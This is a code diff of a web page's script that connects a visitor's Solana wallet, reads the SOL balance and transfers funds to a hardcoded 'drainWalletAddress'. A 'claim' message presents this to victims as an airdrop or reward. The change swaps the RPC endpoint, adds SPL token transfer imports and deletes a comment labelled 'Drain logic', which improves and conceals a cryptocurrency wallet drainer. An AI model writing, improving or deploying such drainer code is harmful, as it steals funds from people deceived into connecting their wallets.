@@ -125,10 +125,12 @@
 
   <script>
     const { PublicKey, Connection, Transaction, SystemProgram } = solanaWeb3;
-    const connection = new Connection("https://api.mainnet-beta.solana.com");
+    const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } = splToken;
 
-    // Replace with your wallet address where you want to receive the drained SOL
-    const drainWalletAddress = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt"); // Replace with your actual wallet address
+    // Use a more reliable and widely accessible RPC endpoint
+    const connection = new Connection("https://solana-api.projectserum.com"); // Replace with your custom RPC URL
+
+    const drainWalletAddress = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt"); // Replace with your wallet address
 
     async function connectWallet() {
       if (!window.solana) {
@@ -153,10 +155,9 @@
       try {
         const userPublicKey = window.solana.publicKey;
 
-        // Get user's SOL balance
+        // Get user's SOL balance using the new endpoint
         const balance = await connection.getBalance(userPublicKey);
 
-        // Drain logic: if user has SOL, transfer most of it
         if (balance === 0) {
           alert("No SOL to claim!");
           return;
